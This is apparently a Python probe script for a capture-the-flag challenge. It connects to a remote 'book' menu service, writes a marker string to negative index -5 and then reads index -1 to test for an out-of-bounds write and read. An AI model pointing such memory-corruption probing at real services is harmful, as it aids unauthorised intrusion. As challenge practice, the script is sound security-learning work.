import socket
import time
import binascii

HOST = "host5.metaproblems.com"
PORT = 5020


def recv_all(s, timeout=1.0):
    s.settimeout(timeout)
    data = b""
    try:
        while True:
            chunk = s.recv(4096)
            if not chunk:
                break
            data += chunk
            if len(chunk) < 4096:
                break
    except socket.timeout:
        pass
    return data


s = socket.create_connection((HOST, PORT), timeout=10)
print("[*] connected")
print(recv_all(s, 1).decode(errors="ignore"))

# create one book
s.sendall(b"1\n")
time.sleep(0.05)
_ = recv_all(s, 0.2)
s.sendall(b"A\n")
time.sleep(0.05)
_ = recv_all(s, 0.2)
s.sendall(b"1\n")
time.sleep(0.05)
_ = recv_all(s, 0.2)

# write into negative index -5
s.sendall(b"2\n")
time.sleep(0.02)
_ = recv_all(s, 0.1)
s.sendall(b"-5\n")
time.sleep(0.05)
print(recv_all(s, 0.2).decode(errors="ignore"))
# send marker for page 1
s.sendall(b"HELLO-OVERWRITE-TEST\n")
# allow
time.sleep(0.2)
print("[*] wrote marker to -5")
# now read -1 which previously showed menu
s.sendall(b"3\n")
time.sleep(0.02)
_ = recv_all(s, 0.1)
s.sendall(b"-1\n")
time.sleep(0.2)
resp = recv_all(s, 0.5)
print("READ -1 ->")
try:
    print(resp.decode(errors="ignore"))
except Exception:
    print("HEX:", binascii.hexlify(resp))

s.close()
print("[+] done")
